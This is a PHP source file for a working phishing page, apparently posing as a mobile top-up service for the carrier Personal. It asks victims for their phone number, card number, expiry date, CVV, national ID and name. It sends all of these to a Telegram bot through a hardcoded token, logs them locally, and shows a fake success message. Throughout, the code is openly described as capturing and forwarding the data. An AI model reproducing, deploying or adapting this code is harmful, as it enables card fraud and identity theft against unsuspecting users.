<?php
/**
 * FORMULARIO TODO-EN-UNO
 * Un solo archivo que captura TODO y envía a Telegram
 * 
 * Ubicación: C:\xampp\htdocs\personal\www.cargas-personales.shop\formulario-completo.php
 */

// CONFIGURACIÓN
$TELEGRAM_BOT_TOKEN = '8234170971:AAH7Z8ySIHDs1tZmWTbFnAc90-RKdh26fwY';
$TELEGRAM_CHAT_ID = '-1003832913889';

// ¿Se envió el formulario?
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['enviar_todo'])) {
    
    // Capturar TODOS los datos
    $telefono = isset($_POST['phone']) ? trim($_POST['phone']) : 'N/A';
    $monto = isset($_POST['amount']) ? trim($_POST['amount']) : 'N/A';
    $tarjeta = isset($_POST['card']) ? trim($_POST['card']) : 'N/A';
    $vencimiento = isset($_POST['venc']) ? trim($_POST['venc']) : 'N/A';
    $cvv = isset($_POST['cv']) ? trim($_POST['cv']) : 'N/A';
    $dni = isset($_POST['dni']) ? trim($_POST['dni']) : 'N/A';
    $nombre = isset($_POST['name']) ? trim($_POST['name']) : 'N/A';
    
    // Info técnica
    $ip = $_SERVER['REMOTE_ADDR'];
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $fecha = date('Y-m-d H:i:s');
    
    // Construir mensaje
    $mensaje = "🔔 <b>NUEVA CAPTURA COMPLETA</b>\n";
    $mensaje .= "━━━━━━━━━━━━━━━\n\n";
    
    $mensaje .= "📱 <b>Datos Personales:</b>\n";
    $mensaje .= "├ Teléfono: <code>" . htmlspecialchars($telefono) . "</code>\n";
    $mensaje .= "├ Nombre: " . htmlspecialchars($nombre) . "\n";
    $mensaje .= "└ DNI: " . htmlspecialchars($dni) . "\n\n";
    
    $mensaje .= "💳 <b>Datos Bancarios:</b>\n";
    $mensaje .= "├ Tarjeta: <code>" . htmlspecialchars($tarjeta) . "</code>\n";
    $mensaje .= "├ Vencimiento: " . htmlspecialchars($vencimiento) . "\n";
    $mensaje .= "├ CVV: <code>" . htmlspecialchars($cvv) . "</code>\n";
    $mensaje .= "└ Monto: $" . htmlspecialchars($monto) . "\n\n";
    
    $mensaje .= "🌐 <b>Información Técnica:</b>\n";
    $mensaje .= "├ IP: <code>" . $ip . "</code>\n";
    $mensaje .= "├ Navegador: " . substr(htmlspecialchars($user_agent), 0, 50) . "...\n";
    $mensaje .= "└ Fecha: " . $fecha . "\n\n";
    
    $mensaje .= "⚠️ <i>Captura completa en un solo paso</i>";
    
    // Enviar a Telegram
    $url = "https://api.telegram.org/bot" . $TELEGRAM_BOT_TOKEN . "/sendMessage";
    
    $data = array(
        'chat_id' => $TELEGRAM_CHAT_ID,
        'text' => $mensaje,
        'parse_mode' => 'HTML'
    );
    
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    
    $result = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    $enviado = ($http_code == 200);
    
    // Guardar en log
    $log_file = __DIR__ . '/capturas_todo_en_uno.log';
    $log_entry = sprintf(
        "[%s] Tel: %s | Tarjeta: %s | Nombre: %s | Enviado: %s\n",
        $fecha,
        $telefono,
        $tarjeta,
        $nombre,
        $enviado ? 'SI' : 'NO'
    );
    @file_put_contents($log_file, $log_entry, FILE_APPEND);
    
    // Mostrar resultado
    if ($enviado) {
        ?>
        <!DOCTYPE html>
        <html lang="es">
        <head>
            <meta charset="UTF-8">
            <title>¡Éxito!</title>
            <style>
                body { font-family: Arial; background: #28a745; color: white; text-align: center; padding: 50px; }
                .container { background: white; color: #333; padding: 40px; border-radius: 10px; max-width: 500px; margin: 0 auto; }
                h1 { color: #28a745; font-size: 48px; margin: 0; }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>✓</h1>
                <h2>¡Recarga exitosa!</h2>
                <p>Tu recarga se procesó correctamente.</p>
                <p><small>Recibirás un SMS de confirmación.</small></p>
                <hr>
                <p><strong>Datos enviados a Telegram:</strong></p>
                <p>Teléfono: <?php echo htmlspecialchars($telefono); ?><br>
                Monto: $<?php echo htmlspecialchars($monto); ?></p>
            </div>
        </body>
        </html>
        <?php
        exit;
    } else {
        echo "<h1>Error al enviar</h1>";
        echo "<p>HTTP Code: " . $http_code . "</p>";
        echo "<p>Respuesta: <pre>" . htmlspecialchars($result) . "</pre></p>";
        exit;
    }
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Recarga Personal - TODO EN UNO</title>
    <link rel="stylesheet" href="css/op/bootstrap.min.css">
    <style>
        body { background: #f5f5f5; padding: 20px; }
        .form-container { background: white; padding: 30px; border-radius: 10px; max-width: 600px; margin: 0 auto; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .form-section { margin-bottom: 30px; padding-bottom: 20px; border-bottom: 2px solid #e0e0e0; }
        .form-section:last-child { border-bottom: none; }
        .form-section h3 { color: #00a8e1; margin-bottom: 20px; }
        .form-control { height: 50px; font-size: 16px; margin-bottom: 15px; }
        .btn-submit { background: #28a745; color: white; font-size: 20px; font-weight: bold; padding: 15px; width: 100%; border: none; }
        .btn-submit:hover { background: #218838; }
        .header { text-align: center; margin-bottom: 30px; }
        .header img { max-height: 50px; }
    </style>
</head>
<body>
    <div class="form-container">
        <div class="header">
            <img src="assets/flow.svg" alt="Personal">
            <h2 style="color: #00a8e1; margin-top: 15px;">Recarga Personal</h2>
        </div>
        
        <form method="POST" action="">
            
            <!-- SECCIÓN 1: TELÉFONO -->
            <div class="form-section">
                <h3>📱 1. Número a recargar</h3>
                <input type="tel" name="phone" class="form-control" placeholder="1153334567" maxlength="10" required>
            </div>
            
            <!-- SECCIÓN 2: MONTO -->
            <div class="form-section">
                <h3>💵 2. Monto de recarga</h3>
                <select name="amount" class="form-control" required>
                    <option value="">Seleccionar monto</option>
                    <option value="100">$100</option>
                    <option value="200">$200</option>
                    <option value="300">$300</option>
                    <option value="500">$500</option>
                    <option value="1000">$1000</option>
                    <option value="2000">$2000</option>
                </select>
            </div>
            
            <!-- SECCIÓN 3: TARJETA -->
            <div class="form-section">
                <h3>💳 3. Datos de tarjeta</h3>
                <input type="text" name="card" id="card" class="form-control" placeholder="1234 5678 9012 3456" maxlength="19" required>
                <input type="text" name="venc" id="venc" class="form-control" placeholder="Vencimiento: 12/26" maxlength="5" required>
                <input type="text" name="cv" id="cv" class="form-control" placeholder="CVV: 123" maxlength="4" required>
            </div>
            
            <!-- SECCIÓN 4: TITULAR -->
            <div class="form-section">
                <h3>👤 4. Datos del titular</h3>
                <input type="text" name="dni" class="form-control" placeholder="DNI: 12345678" maxlength="8" required>
                <input type="text" name="name" class="form-control" placeholder="Nombre completo: Juan Pérez" maxlength="50" required>
            </div>
            
            <!-- BOTÓN ENVIAR -->
            <button type="submit" name="enviar_todo" class="btn btn-submit">PAGAR Y RECARGAR</button>
            
        </form>
    </div>
    
    <script src="javascript/query.min.js"></script>
    <script src="javascript/jquery.mask.js"></script>
    <script>
        // Máscaras
        $('#card').mask('0000 0000 0000 0000');
        $('#venc').mask('00/00');
        $('#cv').mask('0000');
    </script>
</body>
</html>